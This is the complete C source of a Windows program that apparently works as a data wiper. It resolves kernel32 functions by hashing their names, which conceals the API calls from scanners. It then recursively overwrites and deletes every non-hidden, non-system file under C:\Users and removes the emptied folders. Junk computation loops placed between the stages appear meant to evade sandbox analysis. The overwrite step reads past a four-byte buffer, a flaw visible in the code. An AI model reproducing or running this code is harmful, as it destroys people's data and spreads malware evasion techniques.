#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <windows.h>

DWORD HashOfFunctions[] = {44112, 12415, 44346, 352792, 176840, 10991, 43934, 44816, 1524648};

typedef HANDLE (WINAPI *CreateFileA_t)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL (WINAPI *WriteFile_t)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

typedef BOOL (WINAPI *CloseHandle_t)(HANDLE hObject);

typedef HANDLE (WINAPI *FindFirstFileA_t)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);

typedef BOOL (WINAPI *FindNextFileA_t)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);

typedef BOOL (WINAPI *FindClose_t)(HANDLE hFindFile);

typedef DWORD (WINAPI *GetFileSize_t)(HANDLE hFile, LPDWORD lpFileSizeHigh);

typedef BOOL (WINAPI *DeleteFileA_t)(LPCSTR lpFileName);

typedef BOOL (WINAPI *RemoveDirectoryA_t)(LPCSTR lpPathName);

CreateFileA_t pCreateFileA = NULL;
WriteFile_t pWriteFile = NULL;
CloseHandle_t pCloseHandle = NULL;
FindFirstFileA_t pFindFirstFileA = NULL;
FindNextFileA_t pFindNextFileA = NULL;
FindClose_t pFindClose = NULL;
GetFileSize_t pGetFileSize = NULL;
DeleteFileA_t pDeleteFileA = NULL;
RemoveDirectoryA_t pRemoveDirectoryA = NULL;

DWORD CreateHash(const char *str)
{
	DWORD Hash = 0;
	while (*str != '\0' && *str != '\n')
	{
		Hash = (Hash * 2) + (2 ^ *str);
		str++;
	}
	Hash = Hash / 4;
	return Hash;
}

FARPROC GetProcAddressByHash(HMODULE Module, DWORD Hash)
{
	unsigned char *BaseAddress = (unsigned char *)Module;

	IMAGE_DOS_HEADER *DOSHeader = (IMAGE_DOS_HEADER *)BaseAddress;
	if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("[-] Error: e_magic not valid!\n");
		return NULL;
	}

	IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(BaseAddress + DOSHeader->e_lfanew);
	if (NTHeaders->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("[-] Error: Not a valid PE\n");
		return NULL;
	}

	IMAGE_DATA_DIRECTORY ExportDataDir = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (ExportDataDir.VirtualAddress == 0)
	{
		printf("[-] Error: Export Table missing!\n");
		return NULL;
	}

	IMAGE_EXPORT_DIRECTORY *ExportDir = (IMAGE_EXPORT_DIRECTORY *)(BaseAddress + ExportDataDir.VirtualAddress);

	DWORD *FunctionRVAs = (DWORD *)(BaseAddress + ExportDir->AddressOfFunctions);
	DWORD *NameRVAs = (DWORD *)(BaseAddress + ExportDir->AddressOfNames);
	WORD *NameOrdinals = (WORD *)(BaseAddress + ExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < ExportDir->NumberOfNames; i++)
	{
		char *FunctionName = (char *)(BaseAddress + NameRVAs[i]);
		DWORD CurrentHash = CreateHash(FunctionName);

		if (CurrentHash == Hash)
		{
			WORD Ordinal = NameOrdinals[i];
			DWORD FuncRVA = FunctionRVAs[Ordinal];
			FARPROC FunctionAddress = (FARPROC)(BaseAddress + FuncRVA);
			return FunctionAddress;
		}
	}

	return NULL;
}

int DF(const char *NewPathToFile)
{
	HANDLE File = pCreateFileA(NewPathToFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 3, 128, NULL);

	if (File == INVALID_HANDLE_VALUE)
	{
		return EXIT_FAILURE;
	}

	DWORD SizeToOverwrite = pGetFileSize(File, NULL);

	if (SizeToOverwrite == INVALID_FILE_SIZE)
	{
		pCloseHandle(File);
		return EXIT_FAILURE;
	}

	if (SizeToOverwrite > 4096)
	{
		SizeToOverwrite = (4096 / 2);
	}

	DWORD BytesWritten = 0;
	char Buffer[sizeof(SizeToOverwrite)] = {0};
	BOOL Overwrite = pWriteFile(File, &Buffer, SizeToOverwrite, &BytesWritten, NULL);

	if (Overwrite == 0)
	{
		pCloseHandle(File);
		return EXIT_FAILURE;
	}

	pCloseHandle(File);

	if (pDeleteFileA(NewPathToFile) == 0)
	{
		pCloseHandle(File);
		return EXIT_FAILURE;
	}

	return 0;
}

void LFR(const char *Path)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE FindFile = INVALID_HANDLE_VALUE;
	char SearchPath[MAX_PATH];

	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);

	FindFile = pFindFirstFileA(SearchPath, &FindFileData);
	if (FindFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	do
	{
		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char subPath[MAX_PATH];
				snprintf(subPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
				LFR(subPath);
			}
			else
			{
				char NewPathToFile[MAX_PATH];
				snprintf(NewPathToFile, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);
				DF(NewPathToFile);
			}
		}
	} while (pFindNextFileA(FindFile, &FindFileData) != 0);

	pFindClose(FindFile);
}

int REDR(const char *Path)
{
	WIN32_FIND_DATAA FindFileData;
	HANDLE FindFile = INVALID_HANDLE_VALUE;
	char SearchPath[MAX_PATH];
	char SubPath[MAX_PATH];
	BOOL IsEmpty = TRUE;

	snprintf(SearchPath, MAX_PATH, "%s\\*", Path);

	FindFile = pFindFirstFileA(SearchPath, &FindFileData);

	if (FindFile == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	do
	{
		if (strcmp(FindFileData.cFileName, ".") != 0 && strcmp(FindFileData.cFileName, "..") != 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) == 0 && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0)
		{
			snprintf(SubPath, MAX_PATH, "%s\\%s", Path, FindFileData.cFileName);

			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (REDR(SubPath) != 0)
				{
					IsEmpty = FALSE;
				}
			}
			else
			{
				IsEmpty = FALSE;
			}
		}
	} while (pFindNextFileA(FindFile, &FindFileData) != 0);

	pFindClose(FindFile);

	if (IsEmpty)
	{
		if (pRemoveDirectoryA(Path))
		{
			return 0;
		}
		else
		{
			return 1;
		}
	}

	return 1;
}

void randfunc1()
{
	int64_t x = 0;
	int64_t y = 1;
	for (int64_t i = 0; i < 8000000; ++i)
	{
		x += i * (y | (i >> 2));
		y ^= (i & 0xF) + (x >> 4);
		x ^= (y << 3) + (i * 7);
		x = x % (y | 1);
	}
}

void randfunc2()
{
	uint32_t a = 123456789;
	uint32_t b = 987654321;
	for (uint32_t i = 0; i < 5000000; ++i)
	{
		a = (a * b + i) ^ (a >> 3);
		b = (b - a) | (i << 2);
		a ^= b & 0xAAAAAAAA;
		b = (b << 1) + (a >> 2);
		a = a % (b | 1);
	}
}

void randfunc3()
{
	double x = 1.0;
	double y = 2.0;
	for (int i = 0; i < 3250000; ++i)
	{
		x += y * 0.5;
		y -= x / 3.14159;
		x = (x * y) - (i * 0.1);
		y = (y + x) / (i + 1);
	}
}

void randfunc4()
{
	uint64_t x = 0xFFFFFFFF;
	uint64_t y = 0x12345678;
	for (uint64_t i = 0; i < 1800000; ++i)
	{
		x = (x ^ y) + (i << 1);
		y = (y | x) - (i >> 3);
		x = x * y + (i & 0xFF);
		y = y ^ (x >> 2);
		x = x % (y | 1);
	}
}

void randfunc5()
{
	int64_t x = 0;
	int64_t y = 1;
	for (int64_t i = 0; i < 4900000; ++i)
	{
		x += i * (y | (i >> 2));
		y ^= (i & 0xF) + (x >> 4);
		x ^= (y << 3) + (i * 7);
		x = x % (y | 1);
	}
}

int main()
{
	HMODULE Kernel32 = GetModuleHandleA("kernel32.dll");
	if (Kernel32 == NULL)
	{
		printf("[-] Failed to get handle for kernel32.dll: %ld\n", GetLastError());
		return 1;
	}

	unsigned char *BAddr = (unsigned char *)Kernel32;
	printf("[+] Base address of kernel32.dll: 0x%p\n", BAddr);

	for (int i = 0; i < sizeof(HashOfFunctions) / sizeof(HashOfFunctions[0]); i++)
	{
		FARPROC func = GetProcAddressByHash(Kernel32, HashOfFunctions[i]);
		if (func == NULL)
		{
			printf("[-] Failed to resolve function for hash: %ld\n", HashOfFunctions[i]);
			return 1;
		}

		if (i == 0) pCreateFileA = (CreateFileA_t)func;
		else if (i == 1) pWriteFile = (WriteFile_t)func;
		else if (i == 2) pCloseHandle = (CloseHandle_t)func;
		else if (i == 3) pFindFirstFileA = (FindFirstFileA_t)func;
		else if (i == 4) pFindNextFileA = (FindNextFileA_t)func;
		else if (i == 5) pFindClose = (FindClose_t)func;
		else if (i == 6) pGetFileSize = (GetFileSize_t)func;
		else if (i == 7) pDeleteFileA = (DeleteFileA_t)func;
		else if (i == 8) pRemoveDirectoryA = (RemoveDirectoryA_t)func;
	}

	if (!pCreateFileA || !pWriteFile || !pCloseHandle || !pFindFirstFileA || !pFindNextFileA || !pFindClose || !pGetFileSize || !pDeleteFileA || !pRemoveDirectoryA)
	{
		printf("[-] Error: Not all functions were resolved!\n");
		return 1;
	}

	randfunc1();
	randfunc2();
	LFR("C:\\Users");
	randfunc3();
	REDR("C:\\Users");
	randfunc4();
	randfunc5();
	printf("Done!\n");

	return 0;
}
